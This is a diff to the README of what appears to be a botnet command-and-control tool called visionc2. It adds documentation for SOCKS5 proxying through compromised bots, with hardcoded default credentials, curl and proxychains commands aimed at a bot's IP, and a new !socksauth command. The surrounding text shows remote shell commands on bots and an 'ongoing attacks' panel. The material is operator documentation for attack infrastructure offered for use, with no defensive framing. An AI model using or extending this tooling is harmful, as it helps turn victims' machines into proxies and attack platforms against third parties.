@@ -333,15 +333,25 @@ Bot: a1b2c3d4
 [enter] Start  [esc] Cancel
 ```
 
+### SOCKS5 Authentication
+
+The proxy supports username/password authentication (RFC 1929). Credentials are set in `bot/config.go` (`socksUsername` / `socksPassword`) and can be updated at runtime:
+
+- From TUI Socks Manager or remote shell: `!socksauth <user> <pass>`
+- Leave both empty to allow unauthenticated access
+
 ### Using the Proxy
 
 After starting, connect via:
 
 ```bash
-# Configure proxychains
-echo "socks5 BOT_IP 1080" >> /etc/proxychains.conf
+# With authentication (default: visionc2 / synackrst666)
+curl --socks5-basic -U visionc2:synackrst666 --socks5 BOT_IP:1080 http://example.com
 
-# Or use curl directly
+# Configure proxychains
+echo "socks5 BOT_IP 1080 visionc2 synackrst666" >> /etc/proxychains.conf
+
+# Without auth (if credentials are empty)
 curl --socks5 BOT_IP:1080 http://example.com
 ```
 
@@ -457,6 +467,7 @@ Example: `!a1b2c3d4 !shell whoami`
 |---------|-------------|
 | `!socks <port>` | Start SOCKS5 on port |
 | `!stopsocks` | Stop all proxies |
+| `!socksauth <user> <pass>` | Update SOCKS5 proxy credentials |
 
 ---
 
@@ -493,6 +504,7 @@ Example: `!a1b2c3d4 !shell whoami`
 │ SOCKS MANAGER                                                   │
 │   s         Start socks       x        Stop socks               │
 │   ←/→       Switch view       r        Refresh                  │
+│   Auth: !socksauth <user> <pass> (via shell)                    │
 ├─────────────────────────────────────────────────────────────────┤
 │ ONGOING ATTACKS                                                 │
 │   s         Stop all attacks  r        Refresh                  │
